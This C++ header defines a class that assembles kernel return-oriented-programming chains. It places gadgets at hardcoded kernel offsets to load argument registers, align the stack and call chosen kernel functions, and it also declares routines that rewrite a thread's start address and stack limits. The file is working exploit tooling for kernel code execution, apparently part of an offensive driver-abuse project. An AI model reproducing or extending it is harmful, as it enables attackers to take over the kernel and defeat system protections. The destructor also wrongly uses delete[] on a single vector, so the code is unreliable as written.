#pragma once
#include <vector>
#include <string_view>
#include <include/driver/kernel_addresses.hpp>

class StackManager
{
protected:
	std::vector<std::uint64_t>* Stack = nullptr;
private:
    StackManager* InitStackManager = nullptr;
    std::size_t InitStackSize = NULL;
	std::uintptr_t KernelModuleBase = NULL;
	std::size_t StackSizeLimit = NULL;
    void ChainStack(StackManager* NewStack);
    void ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue);

public:
	StackManager(const std::uintptr_t _KernelModuleBase, StackManager* _InitStackManager = nullptr, const size_t _StackSizeLimit = 0x2000)
		: KernelModuleBase(_KernelModuleBase), InitStackManager(_InitStackManager), StackSizeLimit(_StackSizeLimit)
	{
		Stack = new std::vector<std::uint64_t>;

        // If an init stack was specified, we must add it prior to the rest of our stack.
        if (InitStackManager) {
            this->ChainStack(InitStackManager);
            this->InitStackSize = this->InitStackManager->GetStackSize();
        }
	}

	~StackManager()
	{
		delete[] Stack;
	}

    std::uint64_t* GetStackBuffer(const bool IncludeInitStack = false);
    std::size_t GetStackSize(const bool IncludeInitStack = false);
    void AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName);
    void AddValue(const std::uint64_t Value, const std::string_view& ValueLogName);
    void AddPadding(const std::size_t PaddingSize = 8);
    void ModifyThreadStartAddress(const std::uint64_t NewStartAddress);
    void ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBase, const std::uint64_t NewStackLimit);

    template<typename... Args>
    void AddFunctionCall(const std::string_view& FunctionName, Args&&... args)
    {
        constexpr std::size_t ArgCount = sizeof...(Args);
        const std::uint64_t FunctionAddress = Driver::GetKernelFunctionOffset(FunctionName);

        // Setup ropchain for arguments only if there are any
        if constexpr (ArgCount > 0)
        {
            std::uint64_t ConvertedArgs[] = { static_cast<std::uint64_t>(args)... };

            // Setting up the fourth gadget here, since there is no "pop r9; ret;" gadget universally.
            // this gadget requires us to set up both r8 and rcx correctly, so we will just do this before
            // all other args.
            if (ArgCount >= 4)
            {
                this->AddGadget(0x47f82d, "pop r8; ret;");
                this->AddValue(0, "set r8 to 0");
                this->AddGadget(0x24cd7b, "pop rcx; ret;");
                this->AddValue(ConvertedArgs[3], "FourthArg");
                this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
            }

            if (ArgCount >= 1)
            {
                this->AddGadget(0x24cd7b, "pop rcx; ret;"); // pop rcx; ret;
                this->AddValue(ConvertedArgs[0], "FirstArg");
            }

            if (ArgCount >= 2)
            {
                this->AddGadget(0x480032, "pop rdx; ret;"); // pop rdx; ret;
                this->AddValue(ConvertedArgs[1], "SecondArg");
            }

            if (ArgCount >= 3)
            {
                this->AddGadget(0x47f82d, "pop r8; ret;"); // pop r8; ret;
                this->AddValue(ConvertedArgs[2], "ThirdArg");
            }
        }

        if (this->GetStackSize() % 16 != 0)
            this->AddGadget(0x20043b, "ret (align)");

        this->AddGadget(FunctionAddress, "Function to call address");
        this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
        this->AddValue(0, "Shadow space 1");
        this->AddValue(0, "Shadow space 2");
        this->AddValue(0, "Shadow space 3");
        this->AddValue(0, "Shadow space 4");
    }
};
